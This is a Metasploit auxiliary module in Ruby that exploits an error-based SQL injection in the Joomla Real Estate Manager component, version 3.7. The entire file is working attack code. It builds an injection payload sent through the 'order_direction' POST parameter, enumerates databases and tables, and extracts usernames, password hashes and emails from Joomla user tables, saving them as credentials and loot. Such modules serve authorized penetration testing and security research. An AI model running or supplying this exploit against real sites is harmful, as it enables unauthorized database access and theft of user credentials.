##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla Real Estate Manager Component Error-Based SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection vulnerability in Joomla Plugin
        com_realestatemanager versions 3.7 in order to either enumerate
        usernames and password hashes.
      },
      'References'     =>
        [
          ['EDB', '38445']
        ],
      'Author'         =>
        [
          'Omer Ramic', # discovery
          'Nixawk', # metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Oct 22 2015'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/'])
      ])
  end

  def print_good(message='')
    super("#{rhost}:#{rport} - #{message}")
  end

  def print_status(message='')
    super("#{rhost}:#{rport} - #{message}")
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user]
    }.merge(service_data)

    if opts[:password]
      credential_data.merge!(
        private_data: opts[:password],
        private_type: :nonreplayable_hash,
        jtr_format: 'md5'
      )
    end

    login_data = {
      core: create_credential(credential_data),
      status: opts[:status],
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def check
    flag = Rex::Text.rand_text_alpha(5)
    payload = "0x#{flag.unpack('H*')[0]}"

    data = sqli(payload)
    if data && data.include?(flag)
      Msf::Exploit::CheckCode::Vulnerable
    else
      Msf::Exploit::CheckCode::Safe
    end
  end

  def sqli(query)
    lmark = Rex::Text.rand_text_alpha(5)
    rmark = Rex::Text.rand_text_alpha(5)

    payload = '(SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
    payload << "0x#{lmark.unpack('H*')[0]},"
    payload << '%s,'
    payload << "0x#{rmark.unpack('H*')[0]},"
    payload << 'FLOOR(RAND(0)*2)'
    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'

    get = {
      'option' => 'com_realestatemanager',
      'task' => 'showCategory',
      'catid' => '50',
      'Itemid' => '132'
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get'  => get,
    })


    if res && res.code == 200
      cookie = res.get_cookies
      post = {
        'order_field' => 'price',
        'order_direction' => 'asc,' + (payload % query)
      }
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'POST',
        'cookie' => cookie,
        'vars_get'  => get,
        'vars_post' => post
      })

      # Error based SQL Injection
      if res && res.code == 500 && res.body =~ /#{lmark}(.*)#{rmark}/
        $1
      end
    end
  end

  def query_databases
    dbs = []

    query = '(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) '
    query << 'FROM INFORMATION_SCHEMA.SCHEMATA)'

    dbc = sqli(query)

    query_fmt = '(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) '
    query_fmt << 'FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1)'

    0.upto(dbc.to_i - 1) do |i|
      dbname = sqli(query_fmt % i)
      dbs << dbname
      vprint_good("Found database name: #{dbname}")
    end

    %w(performance_schema information_schema mysql).each do |dbname|
      dbs.delete(dbname) if dbs.include?(dbname)
    end
    dbs
  end

  def query_tables(database)
    tbs = []

    query = '(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) '
    query << 'FROM INFORMATION_SCHEMA.TABLES '
    query << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}))"

    tbc = sqli(query)

    query_fmt = '(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) '
    query_fmt << 'FROM INFORMATION_SCHEMA.TABLES '
    query_fmt << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}) "
    query_fmt << 'LIMIT %d,1)'

    vprint_status('tables in database: %s' % database)
    0.upto(tbc.to_i - 1) do |i|
      tbname = sqli(query_fmt % i)
      vprint_good("Found table #{database}.#{tbname}")
      tbs << tbname if tbname =~ /_users$/
    end
    tbs
  end

  def query_columns(database, table)
    cols = []
    query = "(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})"

    colc = sqli(query)
    vprint_status("Found Columns: #{colc} from #{database}.#{table}")

    valid_cols = [   # joomla_users
      'activation',
      'block',
      'email',
      'id',
      'lastResetTime',
      'lastvisitDate',
      'name',
      'otep',
      'otpKey',
      'params',
      'password',
      'registerDate',
      'requireReset',
      'resetCount',
      'sendEmail',
      'username'
    ]

    query_fmt = '(SELECT MID((IFNULL(CAST(%s AS CHAR),0x20)),%d,54) '
    query_fmt << "FROM #{database}.#{table} ORDER BY id LIMIT %d,1)"

    0.upto(colc.to_i - 1) do |i|
      record = {}
      valid_cols.each do |col|
        l = 1
        record[col] = ''
        loop do
          value = sqli(query_fmt % [col, l, i])
          break if value.blank?
          record[col] << value
          l += 54
        end
      end
      cols << record

      unless record['username'].blank?
        print_good("Found credential: #{record['username']}:#{record['password']} (Email: #{record['email']})")
        report_cred(
          ip: rhost,
          port: datastore['RPORT'],
          user: record['username'].to_s,
          password: record['password'].to_s,
          status: Metasploit::Model::Login::Status::UNTRIED,
          proof: record.to_s
        )
      end

      vprint_status(record.to_s)
    end
    cols
  end

  def run
    dbs = query_databases
    dbs.each do |db|
      tables = query_tables(db)
      tables.each do |table|
        cols = query_columns(db, table)
        next if cols.blank?
        path = store_loot(
          'joomla.users',
          'text/plain',
          datastore['RHOST'],
          cols.to_json,
          'joomla.users')
        print_good('Saved file to: ' + path)
      end
    end
  end
end
